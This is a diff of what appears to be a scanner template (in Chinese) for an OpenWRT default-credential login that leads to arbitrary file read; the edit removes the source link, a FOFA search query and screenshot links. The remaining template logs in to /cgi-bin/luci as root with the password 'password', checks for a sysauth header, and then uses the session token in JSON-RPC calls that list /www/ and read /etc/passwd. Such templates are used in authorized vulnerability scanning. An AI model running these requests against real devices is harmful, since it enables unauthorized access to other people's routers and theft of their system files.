@@ -3,12 +3,8 @@ info:
   name: OpenWRT 弱口令登录导致任意文件读取
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lek6ykuyu9cog5gy'
+  description: ''
   tags: lfi,default-login,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lek6ykuyu9cog5gy
-    fofa: title="OpenWrt"
 http:
 - raw:
   - 'POST /cgi-bin/luci HTTP/1.1
@@ -25,11 +21,8 @@ http:
     luci_username=root&luci_password=password
 
 
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1734432928614-b67fbd19-020e-4f70-bb42-e716554a6fe3.png)
-
     出现302且响应中头携带sysauth则表明存在弱口令。登录尝试：
 
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1734432928863-ac8bd11f-dbcd-47b1-a897-c490a7fdc97f.png)
 
     使用step1获取的认证凭据进行文件读取
 
@@ -61,7 +54,6 @@ http:
 
     [{"jsonrpc":"2.0","id":0,"method":"call","params":["91fc6285f0640e1201889c8fef8a13d2","file","list",{"path":"/www/"}]}]
 
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1734432929096-69901d44-02af-4b07-8f49-af52209cc6a9.png)
 
     任意文件读取'
   redirects: false
@@ -93,9 +85,6 @@ http:
 
     [{"jsonrpc":"2.0","id":0,"method":"call","params":["91fc6285f0640e1201889c8fef8a13d2","file","read",{"path":"/etc/passwd"}]}]
 
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1734432929459-8d3cc3eb-6133-4d04-9d07-d2ea3729ebd6.png)
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1734432929700-19fae6dc-79e2-4d8f-b32a-7a3111fd4bd8.png)
 
     弱口令对照表'
   redirects: false
